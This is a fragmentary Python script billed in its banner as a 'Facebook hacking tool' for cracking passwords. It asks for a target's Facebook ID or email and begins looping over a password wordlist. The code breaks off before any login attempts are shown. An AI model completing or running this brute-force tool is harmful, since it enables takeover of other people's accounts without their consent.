...
def banner():
   ...
   __    ____   ____   __   _  _    ____  ____  _  _  ___   
  /__\  (  _ \ (_  _) /__\ ( \/ )  (  _ \( ___)( \/ )/ __)  
 /(__)\  )   /.-_)(  /(__)\ \  /    )(_) ))__)  \  / \__ \  
(__)(__)(_)\_)\____)(__)(__)(__)   (____/(____)  \/  (___/  



             🄵🄰🄲🄴🄱🄾🄾🄺 🄷🄰🄲🄺🄸🄽🄶 🅃🄾🄾🄻
             
             ᴄʀᴀᴄᴋɪɴɢ ᴀʟʟ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴏ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ
...
if __name__ == "__main__":
	banner()
	em = input('Enter The Target Facebook ID/Emaill: ')
	ps_list = open('pass.txt').read().splitlines()
	for ps in ps_list:
